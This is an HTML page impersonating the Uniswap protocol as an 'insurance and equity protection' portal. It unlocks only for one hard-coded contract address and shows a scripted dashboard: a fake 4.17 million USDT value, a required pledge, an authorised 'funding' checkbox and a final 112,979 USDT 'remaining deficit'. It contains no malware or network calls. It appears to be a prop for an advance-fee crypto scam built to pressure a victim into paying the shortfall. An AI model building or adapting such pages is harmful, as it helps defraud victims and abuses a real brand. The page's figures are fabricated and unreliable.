<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uniswap Protocol | Institutional Insurance</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #191B1F;
            --container: #212429;
            --pink: #FF007A;
            --text-sec: #8F96AC;
            --border: #40444F;
            --green: #27AE60;
            --red: #FF4343;
        }

        body {
            background-color: var(--bg);
            color: #FFFFFF;
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .uni-logo-landing {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 15px rgba(255, 0, 122, 0.4));
        }

        .uni-logo-widget {
            width: 48px;
            height: 48px;
            margin-bottom: 16px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            filter: drop-shadow(0 0 8px rgba(255, 0, 122, 0.3));
        }

        .btn-main {
            background: var(--pink);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 20px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 15px rgba(255, 0, 122, 0.2);
        }

        .btn-main:hover { transform: translateY(-2px); background: #D10066; }

        .btn-main:disabled {
            background: #2C2F36;
            color: #565A69;
            cursor: not-allowed;
            box-shadow: none;
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(12px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .widget {
            background: var(--container);
            width: 420px;
            border-radius: 32px;
            padding: 32px;
            border: 1px solid var(--border);
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
        }

        .widget-header {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 24px;
        }

        .input-group {
            background: var(--bg);
            border-radius: 20px;
            padding: 18px;
            border: 1px solid var(--border);
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            font-size: 11px;
            color: var(--text-sec);
            display: block;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input[type="text"] {
            background: transparent;
            border: none;
            color: white;
            width: 100%;
            font-size: 14px;
            outline: none;
            font-family: monospace;
        }

        .stat-card {
            background: var(--bg);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: left;
        }

        .stat-line {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .stat-label { color: var(--text-sec); }
        .stat-val { font-weight: 600; }

        .fund-box {
            background: rgba(39, 174, 96, 0.08);
            border: 1px solid rgba(39, 174, 96, 0.2);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }

        .checkbox-area {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            cursor: pointer;
            margin-top: 12px;
        }

        .checkbox-area input {
            width: 18px;
            height: 18px;
            accent-color: var(--pink);
            margin-top: 2px;
        }

        .checkbox-area span {
            font-size: 12px;
            color: var(--text-sec);
            line-height: 1.5;
        }

        .deficit-view {
            display: none;
            padding: 24px;
            background: rgba(255, 67, 67, 0.08);
            border: 1px solid rgba(255, 67, 67, 0.2);
            border-radius: 20px;
            animation: slideUp 0.3s ease-out;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .deficit-amt {
            color: var(--red);
            font-size: 28px;
            font-weight: 700;
            display: block;
            margin-top: 8px;
        }
    </style>
</head>
<body>

    <!-- HOME PAGE -->
    <div id="homePage" style="text-align: center;">
        <img src="https://raw.githubusercontent.com/Uniswap/assets/master/blockchains/ethereum/assets/0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984/logo.png" class="uni-logo-landing" alt="Uniswap">
        <h1 style="margin-bottom: 10px; font-weight: 700;">Uniswap Protocol</h1>
        <p style="color: var(--text-sec); margin-bottom: 30px;">Insurance & Equity Protection</p>
        <button class="btn-main" onclick="toggleModal(true)">Apply for Insurance Coverage</button>
    </div>

    <div class="overlay" id="overlay">
        <div class="widget">
            <!-- PERSISTENT LOGO: This logo is outside the steps, so it is always visible -->
            <img src="https://raw.githubusercontent.com/Uniswap/assets/master/blockchains/ethereum/assets/0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984/logo.png" class="uni-logo-widget" alt="Uniswap">
            
            <!-- STEP 1: LOGIN -->
            <div id="stepLogin">
                <div class="widget-header">Verify Contract</div>
                <div class="input-group">
                    <label>Contract Address</label>
                    <input type="text" id="contractInput" placeholder="0x...">
                </div>
                <button class="btn-main" style="width: 100%;" onclick="validate()">Access Portal</button>
                <div id="error" style="color: var(--red); font-size: 12px; margin-top: 15px; display: none;">Error: Smart contract not found.</div>
            </div>

            <!-- STEP 2: DASHBOARD -->
            <div id="stepDash" style="display: none;">
                <div class="widget-header">Insurance Dashboard</div>
                
                <div class="stat-card">
                    <div class="stat-line"><span class="stat-label">Value</span><span class="stat-val">4,168,909 USDT</span></div>
                    <div class="stat-line"><span class="stat-label">Rate</span><span class="stat-val">6.5%</span></div>
                    <div class="stat-line" style="border-top: 1px solid #333; padding-top: 12px; margin-top: 8px;">
                        <span class="stat-label">Required Pledge</span>
                        <span class="stat-val" style="color: var(--pink);">270,979 USDT</span>
                    </div>
                </div>

                <div class="fund-box" id="fundModule">
                    <div style="font-size: 11px; color: var(--text-sec); text-transform: uppercase;">Available Funding</div>
                    <div style="font-size: 24px; font-weight: 700; color: var(--green); margin: 5px 0;">158,000 USDT</div>
                    
                    <label class="checkbox-area">
                        <input type="checkbox" id="authCheck" onchange="checkBtn()">
                        <span>I authorize 158,000 USDT to be used as funding for the insurance pledge.</span>
                    </label>
                </div>

                <button class="btn-main" id="execBtn" style="width: 100%;" disabled onclick="finalize()">Execute Funding</button>

                <!-- STEP 3: FINAL DEFICIT -->
                <div id="deficitBox" class="deficit-view">
                    <div class="stat-label">Remaining Deficit</div>
                    <span class="deficit-amt" id="deficitVal"></span>
                    <div style="font-size: 10px; color: var(--text-sec); margin-top: 12px; text-transform: uppercase;">
                        Status: Awaiting Liquidity
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        const TARGET = "0x133fc2abba51b6f192c80f1c066e97d23a294571";
        const REQ = 270979;
        const ALLOC = 158000;

        function toggleModal(s) { document.getElementById('overlay').style.display = s ? 'flex' : 'none'; }

        function validate() {
            const val = document.getElementById('contractInput').value.trim().toLowerCase();
            if (val === TARGET.toLowerCase()) {
                document.getElementById('stepLogin').style.display = 'none';
                document.getElementById('stepDash').style.display = 'block';
            } else {
                document.getElementById('error').style.display = 'block';
            }
        }

        function checkBtn() { document.getElementById('execBtn').disabled = !document.getElementById('authCheck').checked; }

        function finalize() {
            const diff = REQ - ALLOC;
            document.getElementById('fundModule').style.display = 'none';
            document.getElementById('execBtn').style.display = 'none';
            document.getElementById('deficitBox').style.display = 'block';
            document.getElementById('deficitVal').innerText = diff.toLocaleString() + " USDT";
        }

        window.onclick = function(e) { if (e.target == document.getElementById('overlay')) toggleModal(false); }
    </script>
</body>
</html>
